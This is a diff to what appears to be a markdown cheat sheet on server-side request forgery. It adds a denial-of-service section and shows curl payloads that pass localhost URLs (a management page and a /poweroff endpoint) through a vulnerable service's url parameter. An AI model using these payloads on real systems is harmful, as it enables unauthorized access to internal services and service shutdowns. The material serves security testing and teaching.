@@ -1,7 +1,9 @@
 # SSRF
 
 ## Table of Contents
+
 - [Access Control Bypass](#access-control-bypass)
+- [Denial of Service](#denial-of-service)
 
 ## Access Control Bypass
 
@@ -22,11 +24,13 @@
     curl https://[VULNERABLE-SERVICE]/translate?url=http://127.0.0.1:8888/management
     ```
 
-### It is possible to interact with internal services
+## Denial of Service
 
-- DOS
+### It is possible to interact with internal services, causing service interruptions.
+
+- Calling a management endpoint of an internal service
     ```bash
     curl https://[VULNERABLE-SERVICE]/translate?url=http://127.0.0.1:8888/poweroff
     ```
-      
+
 [^1]: Based on IMDSv1 (AWS)
